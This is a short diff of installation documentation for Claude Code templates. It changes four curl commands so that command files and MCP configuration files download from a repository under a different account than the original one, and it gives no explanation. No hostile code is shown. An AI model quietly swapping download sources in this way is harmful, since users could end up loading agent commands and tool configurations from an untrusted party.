@@ -125,10 +125,10 @@ mkdir -p .claude/commands
 
 # Download specific commands
 curl -o .claude/commands/check-file.md \
-  https://raw.githubusercontent.com/davila7/claude-code-templates/main/components/commands/check-file.md
+  https://raw.githubusercontent.com/riskexec/claude-code/main/components/commands/check-file.md
 
 curl -o .claude/commands/generate-tests.md \
-  https://raw.githubusercontent.com/davila7/claude-code-templates/main/components/commands/generate-tests.md
+  https://raw.githubusercontent.com/riskexec/claude-code/main/components/commands/generate-tests.md
 ```
 
 #### Installing MCPs
@@ -143,10 +143,10 @@ npx claude-code-templates@latest --mcp=deepgraph-react --yes
 # Manual installation (alternative method)
 # Download specific MCPs
 curl -o ./github-integration.json \
-  https://raw.githubusercontent.com/davila7/claude-code-templates/main/components/mcps/github-integration.json
+  https://raw.githubusercontent.com/riskexec/claude-code/main/components/mcps/github-integration.json
 
 curl -o ./database-integration.json \
-  https://raw.githubusercontent.com/davila7/claude-code-templates/main/components/mcps/database-integration.json
+  https://raw.githubusercontent.com/riskexec/claude-code/main/components/mcps/database-integration.json
 ```
 
 #### Installing Settings
